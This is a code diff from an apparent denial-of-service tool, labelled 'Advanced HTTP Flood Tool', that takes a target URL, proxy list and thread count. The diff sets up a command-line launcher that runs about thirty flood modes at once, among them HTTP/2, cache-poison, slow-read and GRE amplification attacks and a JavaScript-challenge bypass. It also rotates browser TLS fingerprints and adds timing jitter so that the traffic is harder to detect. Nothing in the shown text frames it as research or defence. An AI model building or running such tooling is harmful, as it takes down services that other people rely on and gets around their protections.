-    if args.ip_fragmentation_exploit:
-        tasks.append(ip_fragmentation_exploit(target, threads))
-    if args.icmp_fragment_flood:
-        tasks.append(icmp_fragment_flood(target, threads))
-    if args.gre_amplification:
-        tasks.append(gre_amplification(target, threads))
-    if args.tcp_ack_flood:
-        tasks.append(tcp_ack_flood(target, threads))
-    if args.tcp_xmas_tree_flood:
-        tasks.append(tcp_xmas_tree_flood(target, threads))
-    if args.udp_protocol_exhaustion:
-        tasks.append(udp_protocol_exhaustion(target, threads))
-    if args.tls_handshake_exhaustion:
-        tasks.append(tls_handshake_exhaustion(target, threads))
-    if args.dynamic_payload_mutation:
-        tasks.append(dynamic_payload_mutation(target, proxies, threads, use_tls))
-    if args.header_overflow_exploit:
-        tasks.append(header_overflow_exploit(target, proxies, threads, use_tls))
-    if args.cookie_logic_bombing:
-        tasks.append(cookie_logic_bombing(target, proxies, threads, use_tls))
-    if args.bypass_javascript_challenge:
-        tasks.append(bypass_javascript_challenge(target, proxies, threads, use_tls))
-    if args.recursive_path_ref_exploit:
-        tasks.append(recursive_path_ref_exploit(target, proxies, threads, use_tls))
-    if args.intelligent_async_socket_bomb:
-        tasks.append(intelligent_async_socket_bomb(target, proxies, threads, use_tls))
+    await asyncio.gather(*tasks)
 
-    attack_start = time.time()
-    await asyncio.gather(
-        *tasks,
-        real_time_status_tracker(threads, attack_start, attack_end)
-    )
+# Main Function
+async def main(target, proxies, threads, mode, use_tls, replay_mode):
+    global total_requests, proxy_success, proxy_fail
+    total_requests = 0
+    proxy_success = 0
+    proxy_fail = 0
+
+    modes = [
+        smart_flood_mutation,
+        exploit_chaining_mode,
+        adaptive_ghost_mutation,
+        ai_bypass_header_synthesis,
+        tls_fingerprint_rotate,
+        proxy_score_autobalancer,
+        waf_reaction_simulator,
+        attack_log_replay,
+        lambda: prewarm_fingerprint(aiohttp.ClientSession(), target),
+        stealth_resonance_flood,
+        reverse_choke_flood,
+        logic_flood_mode,
+        slicer_flood_mode,
+        detect_target_profile,
+        auto_mix_flood,
+        http2_flood_mode,
+        chunked_payload_mode,
+        multipart_flood_mode,
+        header_order_mode,
+        stream_body_mode,
+        discover_endpoints_mode,
+        ja3_per_proxy_mode,
+        verb_abuse_mode,
+        token_extract_mode,
+        h2_multiplex_mode,
+        burst_layer_flood,
+        graphql_flood,
+        slow_read_emulator,
+        redirect_stressor,
+        cache_poison_flood,
+        auto_mix_overload_flood
+    ]
+
+    tasks = []
+    for mode_fn in modes:
+        if isinstance(mode_fn, types.FunctionType):
+            task = asyncio.create_task(mode_fn(target, proxies, threads, use_tls, replay_mode))
+        else:
+            task = asyncio.create_task(mode_fn(target, proxies, threads, use_tls))
+        tasks.append(task)
+
+    await asyncio.gather(*tasks)
+
+    print(f"[yellow]Total Requests: {total_requests}")
+    print(f"[green]Successful Requests: {proxy_success}")
+    print(f"[red]Failed Requests: {proxy_fail}")
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    parser = argparse.ArgumentParser(description="Advanced HTTP Flood Tool")
+    parser.add_argument("target", help="Target URL")
+    parser.add_argument("proxies", help="Comma-separated list of proxies")
+    parser.add_argument("threads", type=int, help="Number of threads")
+    parser.add_argument("--tls", action="store_true", help="Use TLS spoofing")
+    parser.add_argument("--replay-mode", choices=["successful", "failed"], help="Replay mode for attack log replay")
+    args = parser.parse_args()
+
+    proxies = load_proxies(args.proxies)
+    asyncio.run(main(args.target, proxies, args.threads, None, args.tls, args.replay_mode))
+
+# TLS Session Reuse
+JA3_FINGERPRINTS = [
+    "chrome_112", "chrome_113", "chrome_120",
+    "firefox_109", "firefox_110", "safari_15_6_1",
+    "edge_109", "opera_95", "ios_15_5"
+]
+
+def get_random_tls_session(target):
+    cid = random.choice(JA3_FINGERPRINTS)
+    s = Session(client_identifier=cid)
+    s.headers.update(generate_headers(target))
+    return s
+
+def smart_jitter():
+    base = random.uniform(0.15, 0.5)
+    if random.random() < 0.2:
+        return base + random.uniform(0.5, 2.5)
+    return base
